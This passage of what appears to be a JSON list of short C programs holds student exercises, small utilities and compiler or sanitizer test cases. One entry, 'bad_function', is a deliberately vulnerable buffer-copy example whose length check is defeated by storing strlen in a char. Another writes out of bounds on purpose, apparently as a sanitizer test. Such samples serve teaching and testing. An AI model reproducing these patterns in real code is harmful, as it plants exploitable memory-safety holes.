    "#include <inttypes.h>\n#include <stdio.h>\n#include <stdlib.h>\nuint8_t random_access_memory[(10 * (1024 * 1024))];\nuint8_t * frame_pointer =\n    (uint8_t *)(random_access_memory + (10 * (1024 * 1024)));\nint main(int argc, char *argv[]) {\n  exit(0);\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    for (double x = 0; x <= 10; x += 0.5)\n        printf(\"log(%.1f) = %lf\\n\", x, log(x));\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint gtc_strlen(const char *str) {\n    int len = 0;\n    while (str[len] != '\\0')\n        len++;\n    return len;\n}\nint main() {\n    char str1[20] = \"Get the Cookie!\";\n    printf(\"    strlen: [%d]\\n\", strlen(str1));\n    printf(\"gts_strlen: [%d]\\n\", gtc_strlen(str1));\n    return 0;\n}",
    "#include <stdio.h>\nint main() {\n    int codigo, qtd;\n    double valor;\n    printf(\"Codigo do produto comprado: \");\n    scanf(\"%d\", &codigo);\n    printf(\"Quantidade comprada: \");\n    scanf(\"%d\", &qtd);\n    if(codigo == 1) {\n        valor = qtd * 5.00;\n    }\n    else if(codigo == 2) {\n        valor = qtd * 3.50;\n    }\n    else if(codigo == 3) {\n        valor = qtd * 4.80;\n    }\n    else if(codigo == 4) {\n        valor = qtd * 8.90;\n    }\n    else if(codigo == 5) {\n        valor = qtd * 7.32;\n    }\n    printf(\"Valor a pagar: R$ %.2lf\\n\", valor);\n    return 0;\n}",
    "volatile int ten = 10;\nint main() {\n  volatile char x[10];\n  x[ten] = 1;\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n  return 0;\n}",
    "#include<stdio.h>\n\nint main(void)\n{\n    int i, j, n, k;\n    int x[1000];\n    while(scanf(\"%d\" , &n) !=(-1))\n    {\n        k = 1;\n        x[0] = 1;\n        for(i = 1; i < 1000; i ++)\n          x[i] = 0;\n        for(i = 1; i <= n; i ++)\n        {\n            for(j = 0; j < k; j ++)\n              x[j] = x[j] * i;\n            for(j = 0; j < k -1; j ++)\n            {\n                if(x[j] > 9999)\n                {\n                    x[j + 1] = x[j + 1] + x[j] / 10000;\n                    x[j] = x[j] % 10000;\n                }\n            }\n            if(x[k - 1] > 9999)\n            {\n                k ++;\n                x[j + 1] = x[j + 1] + x[j] / 10000;\n                x[j] = x[j] % 10000;\n            }\n        }\n        printf(\"%d!\\n\" , n);\n        for(i = k - 1; i >= 0; i --)\n        {\n            if(i != k - 1)\n            {\n                if(x[i] == 0)\n                  printf(\"0000\");\n                else if(x[i] <= 9)\n                  printf(\"000%d\" , x[i]);\n                else if(x[i] <= 99)\n                  printf(\"00%d\" , x[i]);\n                else if(x[i] <= 999)\n                  printf(\"0%d\" , x[i]);\n                else\n                  printf(\"%d\" , x[i]);\n            }\n            else\n              printf(\"%d\" , x[i]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nvoid mstrcat(char *, char *);\nint main()\n{\n char s[] = \"Hello\", t[] = \"world\";\n mstrcat(s, t);\n printf(\"%s\\n\", s);\n printf(\"%s\\n\", t);\n return 0;\n}\nvoid mstrcat(char *s, char *t)\n{\n while (*s != '\\0')\n {\n  s++;\n }\n while ((*s++ = *t++) != '\\0')\n  ;\n}",
    "#include <pthread.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\nvoid* timetable(void* i){\n    int num = *(int*)i;\n    for(int j=1;j<=9;j++){\n        printf(\"%d X %d = %d\\n\", num, j, num*j);\n    }\n    return ((void*)0);\n}\nint main(){\n    pthread_t thread_id[10];\n    for(int i=2;i<=9;i++){\n        pthread_create(&thread_id[i], ((void*)0), timetable, (void*)&i);\n        pthread_join(thread_id[i],((void*)0));\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint* funkcja(int*,int*);\nint main()\n{\n    int x,y;\n    printf(\"Podaj x = \");\n    scanf(\"%i\",&x);\n    printf(\"Podaj y = \");\n    scanf(\"%i\",&y);\n    printf(\"%#010x\",funkcja(&x,&y));\n    return 0;\n}\nint* funkcja(int*a, int*b)\n{\n    if (*a<*b)\n    {\n        return a;\n    }\n    else\n    {\n        return b;\n    }\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <math.h>\n#include <stdlib.h>\nint main()\n{\n    char s[1001];\n    scanf(\"%[^\\n]%*c\", s);\n    int arr[10] = {0};\n    for(int i = 0; i < strlen(s); i++){\n        if(s[i] >= '0' && s[i] <= '9')\n            arr[s[i] - '0']++;\n    }\n    for(int i = 0; i < 10; i++)\n        printf(\"%d \", arr[i]);\n    printf(\"\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint range[673366];\nint binary_search(int *key, int *min, int *max) {\n    int pos = (*max + *min) / 2;\n    if ((*key <= range[pos]) && (*key > range[pos-1]))\n        return pos;\n    if (*key > range[pos]) {\n        *min = pos+1;\n        return (binary_search(key, min, max));\n    }\n    else {\n        *max = pos-1;\n        return (binary_search(key, min, max));\n    }\n}\nvoid build_range() {\n    int num, min, max, key;\n    int i, times, j;\n    num = 11;\n    range[1] = 1;\n    range[2] = 3;\n    range[3] = 5;\n    range[4] = 8;\n    range[5] = 11;\n    i = 6;\n    while (i < 673366) {\n        min = (i/145) + 1;\n        max = (i/2) + 1;\n        key = i;\n        times = binary_search(&key, &min, &max);\n        num += times;\n        range[i] = num;\n        i++;\n    }\n}\nint main() {\n    int n, pos, min, max;\n    build_range();\n    while (1) {\n        scanf(\"%d\", &n);\n        if (n == 0)\n            break;\n        min = 1;\n        max = 673365;\n        pos = binary_search(&n, &min, &max);\n        printf(\"%d\\n\", pos);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main(void){\n    float input;\n    float sum = 0;\n    int qttNums = 4;\n    for (int i = 0; i < qttNums; i++){\n        scanf(\"%f\", &input);\n        sum += input;\n    }\n    printf(\"%f\\n\", (sum / qttNums));\n    return 0;\n}",
    "#include <stdio.h>\n int main()\n        {\n            int num1,num2,soma,media;\n            char nomes;\n            printf(\"entre com o nome: \");\n            scanf(\"%c\", &nomes);\n            printf(\"digite o primeiro numerio: \");\n            scanf(\"%d\", &num1);\n            printf(\"digite o segundo numero: \");\n            scanf(\"%d\", &num2);\n            soma=num1+num2;\n            media=(num1+num2)/2;\n            printf(\"media=%d\", media);\n        }",
    "#include <stdio.h>\nint main()\n{\n    unsigned short n;\n    scanf(\"%hu\", &n);\n    printf(\"Feliz nat\");\n    for (;n > 0; n--)\n        putchar('a');\n    printf(\"l!\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int num;\n    printf(\"Enter a number : \");\n    scanf(\"%d\", &num);\n    if (num > 0)\n    {\n        printf(\"%d is postive number\", num);\n    }\n    else\n    {\n        printf(\"%d is negative numer\", num);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint N;\nint map[100][100];\nvoid cut(int xs, int xe, int ys, int ye)\n{\n int i, j;\n for(i=xs;i<xe;i++)\n {\n  for(j=ys;j<ye;j++)\n  {\n   if(map[xs][ys] != map[i][j])\n    goto next;\n  }\n }\n if(map[xs][ys]) { printf(\"1\"); return; }\n else { printf(\"0\"); return; }\n next:\n {\n  int xh = (xs + xe) / 2;\n  int yh = (ys + ye) / 2;\n  printf(\"(\");\n  cut(xs,xh,ys,yh);\n  cut(xs,xh,yh,ye);\n  cut(xh,xe,ys,yh);\n  cut(xh,xe,yh,ye);\n  printf(\")\");\n }\n}\nint main(void)\n{\n scanf(\"%d\", &N);\n int i, j;\n for(i=0;i<N;i++)\n {\n  for(j=0;j<N;j++)\n   scanf(\"%1d\", &map[i][j]);\n }\n cut(0,N,0,N);\n return 0;\n}",
    "#include<stdio.h>\nint zhishu(int);\nint main()\n{\n int a,b;\n scanf(\"%d\",&a);\n b=a+1;\n while(zhishu(b)==0)\n {\n   b++;}\n     printf(\"%d\",b);\n       return 0;\n}\nint zhishu(int x)\n{\n int z;\n int i;\n i=2;\n while(x%i!=0&&i<=x)\n {i++;}\n if(i==x)\n z=1;\n else\n z=0;\n return z;\n}",
    "#include <stdio.h>\nvoid push();\nvoid pop();\nvoid peek();\nvoid update();\nvoid display();\nint a[100], top = -1;\nint main()\n{\n    int x;\n    while (1)\n    {\n        printf(\"\\n0 or CTRL-C to Exit \");\n        printf(\"\\n1. Push\");\n        printf(\"\\n2. Pop\");\n        printf(\"\\n3. Peek\");\n        printf(\"\\n4. Update\");\n        printf(\"\\n5. Display\");\n        printf(\"\\nEnter your choice? \\n\");\n        scanf(\"%d\", &x);\n        switch (x)\n        {\n        case 0:\n            return 0;\n        case 1:\n            push();\n            break;\n        case 2:\n            pop();\n            break;\n        case 3:\n            peek();\n            break;\n        case 4:\n            update();\n            break;\n        case 5:\n            display();\n            break;\n        default:\n            printf(\"\\nInvalid choice,\\nPlease try again.\\n\");\n        }\n    }\n    return (0);\n}\nvoid push()\n{\n    int n = 0;\n    printf(\"\\nEnter the value to be inserted: \");\n    scanf(\"%d\", &n);\n    top += 1;\n    a[top] = n;\n}\nvoid pop()\n{\n    if (top == -1)\n    {\n        printf(\"\\nStack is empty\");\n    }\n    else\n    {\n        int item;\n        item = a[top];\n        top -= 1;\n        printf(\"\\nPoped item is %d \", item);\n    }\n}\nvoid peek()\n{\n    if (top >= 0)\n        printf(\"\\nThe top element is %d\", a[top]);\n    else\n        printf(\"\\nStack is empty\");\n}\nvoid update()\n{\n    int i, n;\n    printf(\"\\nEnter the position to update? \");\n    scanf(\"%d\", &i);\n    printf(\"\\nEnter the item to insert? \");\n    scanf(\"%d\", &n);\n    if (top - i + 1 < 0)\n    {\n        printf(\"\\nUnderflow condition \");\n    }\n    else\n    {\n        a[top - i + 1] = n;\n    }\n}\nvoid display()\n{\n    if (top == -1)\n    {\n        printf(\"\\nStack is empty\");\n    }\n    else\n    {\n        for (int i = top; i >= 0; i--)\n        {\n            printf(\"%d\\n\", a[i]);\n        }\n    }\n}",
    "#include <stdio.h>\nint N;\nint board[20][20];\nint is_attack(int i,int j)\n{\n    int k,l;\n    for(k=0;k<N;k++)\n    {\n        if((board[i][k] == 1) || (board[k][j] == 1))\n            return 1;\n    }\n    for(k=0;k<N;k++)\n    {\n        for(l=0;l<N;l++)\n        {\n            if(((k+l) == (i+j)) || ((k-l) == (i-j)))\n            {\n                if(board[k][l] == 1)\n                    return 1;\n            }\n        }\n    }\n    return 0;\n}\nint N_queen(int n)\n{\n    int i,j;\n    if(n==0)\n        return 1;\n    for(i=0;i<N;i++)\n    {\n        for(j=0;j<N;j++)\n        {\n            if((!is_attack(i,j)) && (board[i][j]!=1))\n            {\n                board[i][j] = 1;\n                if(N_queen(n-1)==1)\n                 return 1;\n                board[i][j] = 0;\n            }\n        }\n    }\n    return 0;\n}\nint main()\n{\n    printf(\"Enter the value of N for NxN chessboard\\n\");\n    scanf(\"%d\",&N);\n    int i,j;\n    for(i=0;i<N;i++)\n    {\n        for(j=0;j<N;j++)\n        {\n            board[i][j]=0;\n        }\n    }\n    N_queen(N);\n    for(i=0;i<N;i++)\n    {\n        for(j=0;j<N;j++)\n            printf(\"%d\\t\",board[i][j]);\n        printf(\"\\n\");\n    }\n}",
    "#include <stdio.h>\nint main() {\n  return fflush(((void*)0));\n}",
    "#include <stdio.h>\nint main(void)\n{\n  int toes;\n  toes=10;\n  printf(\"Toes is %d\\n\",toes);\n  printf(\"Sum is %d\\n\",toes*2);\n  printf(\"Square is %d\\n\",toes*toes);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a = 4 + 5 * 4 / 2 ;\n    printf(\"1.%d\\n\",a);\n    int b = (2 * 3) + 5 * 3 ;\n    printf(\"2.%d\\n\",b);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(){\n    int x = 5;\n    int y = 6;\n    {int temp;temp =x; x=y; y=temp;};\n    printf(\"x = %d, y = %d\", x, y);\n}",
    "int f(), (*fp)() = f;\n    int main() {\n            return fp();\n    }\n    int f() { return 1; }",
    "#include <stdio.h>\n#include <string.h>\nvoid bad_function(char *input)\n{\n  char dest_buffer[32];\n  char input_len = strlen(input);\n  if (input_len < 32)\n  {\n    strcpy(dest_buffer, input);\n    printf(\"The first command line argument is %s\\n\", dest_buffer);\n  }\n  else\n  {\n    printf(\"Error \u2013 input is too long for buffer\\n\");\n  }\n}\nint main(int argc, char *argv[])\n{\n  if (argc > 1)\n  {\n    bad_function(argv[1]);\n  }\n  else\n  {\n    printf(\"No command line argument was given.\\n\");\n  }\n  return 0;\n}",
    "#include <unistd.h>\n#include <stdio.h>\nint main()\n{\n    for (int i = 0; i <= 100; i+=10)\n    {\n        sleep(1);\n        printf(\"%d%% complete\\r\", i);\n    }\n}",
    "#include <errno.h>\n#include <fcntl.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint dev_null;\nint close_and_copy(int fd) {\n    int copy = dup(fd);\n    if (isatty(fd)) {\n        dup2(dev_null, fd);\n    }\n    return copy;\n}\nvoid restore_fd(int restore, int replace) {\n    dup2(restore, replace);\n    close(replace);\n}\nvoid usage(char **argv) {\n    printf(\"Usage: %s PROGRAM [ARGS ...]\\n\", argv[0]);\n}\nint main(int argc, char **argv) {\n    if (argc < 2) {\n        fprintf((stderr), \"Incorrect usage\\n\");\n        usage(argv);\n        return 1;\n    }\n    dev_null = open(\"/dev/null\", (0x10000000));\n    char **child_call = (argv + 1);\n    close_and_copy(1);\n    pid_t child = fork();\n    if (child == -1) {\n        fprintf((stderr), \"%s: unable to fork\\n\", argv[0]);\n        return 1;\n    }\n    if (child != 0) {\n        return 0;\n    }\n    int stderr_copy = close_and_copy(2);\n    int call_status = execvp(child_call[0], child_call);\n    int exec_err = errno;\n    restore_fd(stderr_copy, 2);\n    if (call_status != 0) {\n        char *msg = ((void*)0);\n        switch (exec_err) {\n            case (44):\n                msg = \"command not found\";\n                break;\n            case (63):\n                msg = \"permission denied\";\n                break;\n            default:\n                msg = \"unable to launch\";\n                break;\n        }\n        fprintf((stderr), \"%s: %s: %s\\n\", argv[0], msg, child_call[0]);\n        return 1;\n    }\n    return 1;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\nint smallest(int arr[], int k, int n)\n{\n int pos = k, small = arr[k], i;\n for(i=k+1;i<n;i++)\n {\n  if(arr[i] < small)\n  {\n   small = arr[i];\n   pos = i;\n  }\n }\n return pos;\n}\nvoid selection_sort(int arr[], int n)\n{\n int k, pos, temp;\n for(k=0;k<n;k++)\n {\n  pos = smallest(arr, k, n);\n  temp = arr[k];\n  arr[k] = arr[pos];\n  arr[pos] = temp;\n }\n}\nint main()\n{\n int arr[20], i, n;\n printf(\"\\n Enter the number of elements in the array : \");\n scanf(\"%d\",&n);\n printf(\"\\n Enter the elements of the array : \");\n for(i=0;i<n;i++)\n {\n  scanf(\"%d\",&arr[i]);\n }\n    selection_sort(arr,n);\n printf(\"\\n The sorted array is :\");\n for(i=0;i<n;i++)\n {\n  printf(\"\\t%d\",arr[i]);\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nvoid qsort(int[], int, int);\nvoid swap(int[], int, int);\nint main(void)\n{\n    int test1[10] = {9, 1, 3, 4, 2, 5, 8, 7, 0, 6};\n    qsort(test1, 0, 9);\n    for(int i = 0; i < 10; i++)\n printf(\" %d \", test1[i]);\n    return 0;\n}\nvoid qsort(int v[], int left, int right)\n{\n    int pivot, l, r;\n    if (left >= right)\n return;\n    pivot = left + ((right - left) / 2);\n    l = left;\n    r = right;\n    for(;;) {\n while (l < r && v[l] < v[pivot])\n     l++;\n while (l < r && v[r] > v[pivot])\n     r--;\n if (l == r)\n     break;\n swap(v, l, r);\n    }\n    qsort(v, left, l);\n    qsort(v, l + 1, right);\n}\nvoid swap(int v[], int i, int j)\n{\n    int temp;\n    temp = v[j];\n    v[j] = v[i];\n    v[i] = temp;\n}",
    "#include <stdio.h>\nint getDivisor(int a,int b)\n{\n int big=(a>b?a:b),small=(a>b?b:a),yu=big%small;\n while(yu){\n  big = small;\n  small = yu;\n  yu = big%small;\n }\n return small;\n}\nint main(int argc, char const *argv[])\n{\n int lines,a,b;\n scanf(\"%d\",&lines);\n getchar();\n for(int i=0;i<lines;i++){\n  scanf(\"%d %d\",&a,&b);\n  getchar();\n  printf(\"%d %d\\n\",getDivisor(a,b),a*b/getDivisor(a,b));\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid swap(int *xp, int *yp) {\n int tmp = *xp;\n *xp = *yp;\n *yp = tmp;\n}\nvoid bubbleSort(int arr[], int size) {\n for (int i = 1; i < size; i++)\n  for (int j = 1; j < size + 1 - i; j++)\n   if (arr[j-1] > arr[j])\n    swap(&arr[j-1], &arr[j]);\n}\nvoid printArray(int arr[], int size) {\n for (int i = 0; i < size; i++) {\n  printf(\"%d \", arr[i]);\n }\n printf(\"\\n\");\n}\nint main() {\n int arr[] = {10, 9, 8, 7, 6, 5, 4, 3, 2, 1};\n int size = sizeof(arr)/sizeof(*arr);\n bubbleSort(arr, size);\n printf(\"Sorted array: \\n\");\n printArray(arr, size);\n return 0;\n}",
    "#include <stdio.h>\nint main(){\n int c, b = 0;\n while((c = getchar()) != (-1)){\n  if(c == ' '){\n   b = 1;\n  }\n  else{\n   if(b){\n    putchar(' ');\n    b = 0;\n   }\n   putchar(c);\n  }\n }\n}",
    "#include <stdio.h>\n\nint main() {\n    int num[2][2] = {{1, 3}, {5, 3}};\n    int deter;\n    deter = (num[0][0] * num[1][1]) - (num[1][0] * num[0][1]);\n    printf(\"El determinante es %d: \", deter);\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int apples;\n    int oranges;\n    printf(\"apples=%d and oranges=%d\", apples, oranges);\n    return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int x, i, n;\n    scanf(\"%d\", &x);\n    for (i=0;i<x;i++){\n        scanf(\"%d\", &n);\n        if (n==0) printf(\"NULL\\n\");\n        else if (n > 0){\n            if (n%2==0) printf(\"EVEN POSITIVE\\n\");\n            else printf(\"ODD POSITIVE\\n\");\n        }\n        else{\n            if (n%2==0) printf(\"EVEN NEGATIVE\\n\");\n            else printf(\"ODD NEGATIVE\\n\");\n        }\n    }\nreturn 0;\n}",
    "#include <stdio.h>\nint main() {\n for (int i = 100; i <= 200; i++) {\n  if(i % 2 !=0) {\n   printf(\"impar %d\", i);\n  }\n }\n}",
    "#include <stdio.h>\nint main(void)\n{\n    char input[255];\n    scanf(\"%255[0-9a-zA-Z ]\", input);\n    printf(\"%s\", input);\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n int n = 4, m = 3;\n int a[n][m];\n int (*p)[m] = a;\n if (p == &a[0]) {\n  printf(\"p == &a[0]\\n\");\n } else {\n  printf(\"p != &a[0]\\n\");\n }\n p += 1;\n if (p == &a[1]) {\n  printf(\"p == &a[1]\\n\");\n } else {\n  printf(\"p != &a[1]\\n\");\n }\n (*p)[2] = 99;\n printf(\"a[1][2] == %d\\n\", a[1][2]);\n n = p - a;\n printf(\"n == %d\\n\", n);\n return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\n#include <stdlib.h>\nint call1(int b) {\n    return b + 1;\n}\nint call0(int a) {\n    return call1(a);\n}\nint main() {\n    int res = call0(2);\n    if (res != 3) {\n        printf(\"Error! %d\\n\", res);\n        return 3;\n    } else {\n        printf(\"Success!\\n\");\n    }\n    return 0;\n}\nvoid FAULT_DETECTED_DWC() {\n    printf(\"corrupted return address\\r\\n\");\n    abort();\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nstatic float fun(int n);\nint main(int argc, char const *argv[])\n{\n    int n;\n    float s;\n    printf(\"PLEASE ENTER THE N : \");\n    scanf(\"%d\", &n);\n    s = fun(n);\n    printf(\"\\nTHE RESULT IS : %f\\n\", s);\n    system(\"pause\");\n    return 0;\n}\nstatic float fun(int n)\n{\n    int i, denominator = 0;\n    float s = 0.0;\n    for (i = 1; i < n; i++)\n    {\n        denominator += i;\n        s += 1.0 / denominator;\n    }\n    return s;\n}",
    "#include <stdio.h>\nint main () {\n puts(\"CD\");\n return 0;\n}",
    "#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <math.h>\nint main(int argc, char *argv[])\n{\n FILE *inputFile = fopen(\"Prob16.in.txt\", \"r\");\n int testCases;\n fscanf(inputFile, \"%d\\n\", &testCases);\n int centerX, centerY, points, outerRadius, innerRadius;\n double currentAngle, angleSpacing, x, y;\n while(testCases > 0){\n  fscanf(inputFile, \"%d %d %d %d %d\\n\", &centerX, &centerY, &points, &outerRadius, &innerRadius);\n  currentAngle = 3.14159265358979323846 / 2;\n  angleSpacing = (2 * 3.14159265358979323846) / (points * 2);\n  for(int i = 0; i < (points * 2); i++){\n   if(i % 2 == 0){\n    x = (outerRadius * cos(currentAngle)) + centerX;\n    y = (outerRadius * sin(currentAngle)) + centerY;\n   }\n   else{\n    x = (innerRadius * cos(currentAngle)) + centerX;\n    y = (innerRadius * sin(currentAngle)) + centerY;\n   }\n   if(x < 0 && x > -0.005){\n    x = 0.00;\n   }\n   if(y < 0 && y > -0.005){\n    y = 0.00;\n   }\n   if(i != 0){\n    printf(\" \");\n   }\n   printf(\"%.2f,%.2f\", x, y);\n   currentAngle = currentAngle + angleSpacing;\n  }\n  printf(\"\\n\");\n  testCases = testCases - 1;\n }\n fclose(inputFile);\n}",
    "#include <stdio.h>\nint maior, menor;\nvoid calculaMaior(int m, int n)\n{\n if(m>n)\n {\n  maior=m;\n  menor=n;\n }\n else\n {\n  maior=n;\n  menor=m;\n }\n return;\n}\nint main()\n{\n    int cont1, cont2, m, n, t;\n scanf(\"%d %d %d\", &m, &n, &t);\n calculaMaior(m,n);\n for(cont2=0;;cont2++)\n  if((cont2*maior)%menor==t%menor)\n  {\n   cont1=(t-(cont2*maior))/menor;\n   printf(\"%d %d %d\", cont1, cont2, cont1+cont2);\n   break;\n  }\n return 0;\n}",
    "typedef unsigned long long uint64;\nvoid g(uint64 x, int y, int z, uint64 *p)\n{\n unsigned w = ((x >> y) & 0xffffffffULL) << (z & 0x1f);\n *p |= (w & 0xffffffffULL) << z;\n}\nint main(void)\n{\n uint64 a = 0;\n g(0xdeadbeef01234567ULL, 0, 0, &a);\n return (a == 0x01234567) ? 0 : 1;\n}",
    "#include<stdio.h>\nint main(){\n int i,j,k,m,n,p,q,a[10][10],b[10][10],c[10][10];\n printf(\"enter the size of first array\\n\");\n scanf(\"%d%d\",&m,&n);\n printf(\"enter the size of second array\\n\");\n scanf(\"%d%d\",&p,&q);\n printf(\"enter the first array\\n\");\n for(i=0;i<m;i++)\n {\n  for(j=0;j<n;j++)\n  {\n   scanf(\"%d\",&a[i][j]);\n  }\n }\n  printf(\"enter the second array\\n\");\n  for(i=0;i<p;i++)\n  {\n   for(j=0;j<q;j++)\n    scanf(\"%d\",&b[i][j]);\n  }\n  for(i=0;i<m;i++)\n  {\n   for(j=0;j<q;j++)\n           {\n             c[i][j]=0;\n             for(k=0;k<n;k++)\n              c[i][j]+=a[i][k]*b[k][j];\n         }\n       }\n           printf(\"multiplied matrix is :\\n\");\n           for(i=0;i<m;i++)\n           {\n            for(j=0;j<q;j++)\n             printf(\" %d\",c[i][j]);\n            printf(\"\\n\");\n           }\n           return 0;\n           }",
    "#include<stdio.h>\nint main( int argc, char **args){\n char *strg = args[1];\n printf(\"Str : %s\\n\", strg);\n char *end = strg;\n char temp;\n while( *end){\n  end++;\n }\n end--;\n printf(\"End : %s\\n\", end);\n while( strg < end){\n  temp = *strg;\n  printf(\"Temp : %c\\n\", temp);\n  *strg++ = *end;\n  *end-- = temp;\n }\n printf(\"Result : %s\\n\", args[1]);\n}",
    "#include <stdio.h>\n#include <ctype.h>\nint main(int argc, char* argv[])\n{\n unsigned int num_chars = 0;\n unsigned int num_upper = 0;\n unsigned int num_lower = 0;\n unsigned int num_whitespace = 0;\n unsigned int num_digits = 0;\n unsigned int num_control = 0;\n unsigned int num_punct = 0;\n unsigned int num_non_print = 0;\n int c;\n while((c = getchar()) != (-1)) {\n  if((0 ? isupper(c) : ((unsigned)(c)-'A') < 26))\n   num_upper++;\n  else if((0 ? islower(c) : ((unsigned)(c)-'a') < 26))\n   num_lower++;\n  else if(__isspace(c))\n   num_whitespace++;\n  else if((0 ? isdigit(c) : ((unsigned)(c)-'0') < 10))\n   num_digits++;\n  else if(iscntrl(c))\n   num_control++;\n  else if(ispunct(c))\n   num_punct++;\n  else if(!(0 ? isprint(c) : ((unsigned)(c)-0x20) < 0x5f))\n   num_non_print++;\n  num_chars++;\n }\n printf(\"num chars: %d\\n\", num_chars);\n printf(\"upper: %f%%\\n\", (float) num_upper / (float) num_chars * 100);\n printf(\"lower: %f%%\\n\", (float) num_lower / (float) num_chars * 100);\n printf(\"whitespace: %f%%\\n\", (float) num_whitespace / (float) num_chars * 100);\n printf(\"digits: %f%%\\n\", (float) num_digits / (float) num_chars * 100);\n printf(\"control: %f%%\\n\", (float) num_control / (float) num_chars * 100);\n printf(\"punct: %f%%\\n\", (float) num_punct / (float) num_chars * 100);\n printf(\"non-print: %f%%\\n\", (float) num_non_print / (float) num_chars * 100);\n return 1;\n}",
    "#include <assert.h>\n#include <stdlib.h>\nint main() {\n    (void)0;\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\nchar* beszur(char string1[], int hely, char string2[]){\n    char *p = (char*) malloc((strlen(string1) + strlen(string2) + 1) * sizeof(char));\n    int i = 0;\n    int pos = 0;\n    while (string1[i] != '\\0'){\n        if (i == hely){\n            int j = 0;\n            while (string2[j] != '\\0'){\n                p[pos++] = string2[j++];\n            }\n        }\n        p[pos++] = string1[i++];\n    }\n    return p;\n}\nint main()\n{\n    char *a = beszur(\"hello!\", 5, \", vilag\");\n    printf(\"%s\", a);\n    free(a);\n    return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nchar *func(char*,int);\nint main(void){\n    int n = 5;\n    char arr[10];\n    int m = 5;\n    func(arr,n);\n    puts(arr);\n    return 0;\n}\nchar * func(char *arr,int n){\n    int i;\n    int temp;\n    for(i = 0; i < n; i++){\n if(temp = getchar()){\n     arr[i] = temp;\n }else{\n     break;\n }\n    }\n    arr[i] = '\\0';\n    return arr;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main()\n{\n int n,i;\n float media,valor;\n printf(\"numero de cd's\\n\");\n scanf(\"%d\",&n);\n for(i=1;i<=n;i++)\n {\n  printf(\"valor do cd numero %d\\n\",i);\n  scanf(\"%f\",&valor);\n  media+=valor;\n }\n media=(media/n);\n printf(\"A media \u00e9 %.2f\",media);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <string.h>\n#include <stdbool.h>\nconst int maxSize = 256;\n_Bool areEqual(char inputString[], char inputSubstring[], int begin)\n{\n    int inputSubstringLength = strlen(inputSubstring);\n    for(int j = 0; j < inputSubstringLength; j++)\n    {\n        if (inputString[begin + j] != inputSubstring[j])\n        {\n            return 0;\n        }\n    }\n    return 1;\n}\nint countTheNumberOfEntries(char *inputString, char *inputSubstring)\n{\n    int count = 0;\n    int inputSubstringLength = strlen(inputSubstring);\n    int inputStringLength = strlen(inputString);\n    for (int i = 0; i < inputStringLength - inputSubstringLength + 1; i++)\n    {\n        if (areEqual(inputString, inputSubstring, i))\n        {\n            count++;\n        }\n    }\n    return count;\n}\nint main()\n{\n    char inputString[maxSize] = \"\";\n    char inputSubstring[maxSize] = \"\";\n    printf(\"Enter the string:\");\n    scanf(\"%s\", &inputString);\n    printf(\"Enter the substring:\");\n    scanf(\"%s\", &inputSubstring);\n    printf(\"The number of occurrences of a substring '%s' in a string '%s' = %d\", inputSubstring, inputString,\n           countTheNumberOfEntries(inputString, inputSubstring));\n    return 0;\n}",
    "#include <stdio.h>\nsize_t add(size_t a, size_t b)\n{\n return a + b;\n}\nint main()\n{\n size_t total = 0;\n for (size_t i = 0; i < 1000; i++) {\n  total = add(total, i);\n\n }\n printf(\"total=%lu\\n\", total);\n return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main(){\n   int i,j,n;\n   char str[100][100],s[100];\n   scanf(\"%d\",&n);\n   for(i=0;i<n;i++){\n      scanf(\"%s\",str[i]);\n   }\n   for(i=0;i<n-1;i++){\n         if(strcmp(str[i],str[i+1])>0){\n            strcpy(s,str[i]);\n            strcpy(str[i],str[i+1]);\n            strcpy(str[i+1],s);\n            i=-1;\n         }\n   }\n    printf(\"Arranged order: \\n\");\n   for(i=0;i<n;i++){\n      printf(\"%s\\n\",str[i]);\n   }\n}",
    "#include <stdio.h>\n#include <string.h>\nvoid strcat_ptr(char *s, char *t, size_t n);\nint main(void)\n{\n  char s[100] = \"This is the first string\";\n  char *t = \", this second string!\";\n  size_t nr_chars = 5;\n  strcat_ptr(s, t, nr_chars);\n  puts(s);\n  return 0;\n}\nvoid strcat_ptr(char *s, char *t, size_t n)\n{\n  size_t s_length = strlen(s);\n  s += s_length;\n  while ((*s++ = *t++) != '\\0' && n--)\n    ;\n}",
    "#include<stdio.h>\nint comb(int m, int n);\nint main()\n{\n int m,n,t;\n scanf(\"%d %d\",&m,&n);\n t=comb(m,n);\n printf(\"%d\",t);\n return 0;\n}\nint comb(int m, int n )\n{\n if(m<n||m<1||n<1)\n     return 0;\n if(n==1)\n     return m;\n if(n==m)\n     return 1;\n return (comb(m-1,n)+comb(m-1,n-1));\n}",
